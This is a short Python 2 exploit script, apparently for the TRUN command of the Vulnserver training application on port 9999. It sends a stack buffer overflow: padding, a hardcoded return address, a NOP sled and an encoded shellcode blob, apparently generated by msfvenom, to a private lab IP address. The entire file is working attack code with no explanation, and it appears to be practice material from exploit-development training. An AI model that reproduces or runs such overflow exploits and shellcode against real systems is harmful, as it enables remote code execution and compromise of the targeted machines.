#!/usr/bin/python

import sys, socket

overflow=("\xb8\xed\xd2\x1e\xe9\xda\xc7\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x42\x12\x83\xc2\x04\x03\xaf\xdc\xfc\x1c\xd3\x09\x82"
"\xdf\x2b\xca\xe3\x56\xce\xfb\x23\x0c\x9b\xac\x93\x46\xc9\x40"
"\x5f\x0a\xf9\xd3\x2d\x83\x0e\x53\x9b\xf5\x21\x64\xb0\xc6\x20"                                                           
"\xe6\xcb\x1a\x82\xd7\x03\x6f\xc3\x10\x79\x82\x91\xc9\xf5\x31"                                                           
"\x05\x7d\x43\x8a\xae\xcd\x45\x8a\x53\x85\x64\xbb\xc2\x9d\x3e"                                                           
"\x1b\xe5\x72\x4b\x12\xfd\x97\x76\xec\x76\x63\x0c\xef\x5e\xbd"                                                           
"\xed\x5c\x9f\x71\x1c\x9c\xd8\xb6\xff\xeb\x10\xc5\x82\xeb\xe7"                                                           
"\xb7\x58\x79\xf3\x10\x2a\xd9\xdf\xa1\xff\xbc\x94\xae\xb4\xcb"                                                           
"\xf2\xb2\x4b\x1f\x89\xcf\xc0\x9e\x5d\x46\x92\x84\x79\x02\x40"                                                           
"\xa4\xd8\xee\x27\xd9\x3a\x51\x97\x7f\x31\x7c\xcc\x0d\x18\xe9"                                                           
"\x21\x3c\xa2\xe9\x2d\x37\xd1\xdb\xf2\xe3\x7d\x50\x7a\x2a\x7a"                                                           
"\x97\x51\x8a\x14\x66\x5a\xeb\x3d\xad\x0e\xbb\x55\x04\x2f\x50"                                                           
"\xa5\xa9\xfa\xf7\xf5\x05\x55\xb8\xa5\xe5\x05\x50\xaf\xe9\x7a"                                                           
"\x40\xd0\x23\x13\xeb\x2b\xa4\xdc\x44\x97\xb7\xb5\x96\xd7\xa6"                                                           
"\x19\x1e\x31\xa2\xb1\x76\xea\x5b\x2b\xd3\x60\xfd\xb4\xc9\x0d"                                                           
"\x3d\x3e\xfe\xf2\xf0\xb7\x8b\xe0\x65\x38\xc6\x5a\x23\x47\xfc"                                                           
"\xf2\xaf\xda\x9b\x02\xb9\xc6\x33\x55\xee\x39\x4a\x33\x02\x63"
"\xe4\x21\xdf\xf5\xcf\xe1\x04\xc6\xce\xe8\xc9\x72\xf5\xfa\x17"
"\x7a\xb1\xae\xc7\x2d\x6f\x18\xae\x87\xc1\xf2\x78\x7b\x88\x92"
"\xfd\xb7\x0b\xe4\x01\x92\xfd\x08\xb3\x4b\xb8\x37\x7c\x1c\x4c"
"\x40\x60\xbc\xb3\x9b\x20\xcc\xf9\x81\x01\x45\xa4\x50\x10\x08"
"\x57\x8f\x57\x35\xd4\x25\x28\xc2\xc4\x4c\x2d\x8e\x42\xbd\x5f"
"\x9f\x26\xc1\xcc\xa0\x62")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"  + "\x90" * 32 + overflow

try:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(('192.168.164.134', 9999))

	s.send(('TRUN /.:/' + shellcode))

	s.close()

except:

	print "Error connecting to server"

	sys.exit()
